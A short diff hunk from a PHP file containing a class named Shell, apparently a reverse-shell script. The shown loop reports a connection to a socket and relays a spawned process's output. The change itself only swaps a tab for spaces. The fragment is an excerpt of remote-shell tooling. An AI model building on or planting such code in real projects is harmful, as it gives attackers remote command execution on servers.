@@ -126,7 +126,7 @@ class Shell {
                     $status = proc_get_status($process);
                     @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
                     do {
-						$status = proc_get_status($process);
+                        $status = proc_get_status($process);
                         if (feof($socket)) { // check for end-of-file on SOCKET
                             echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                         } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
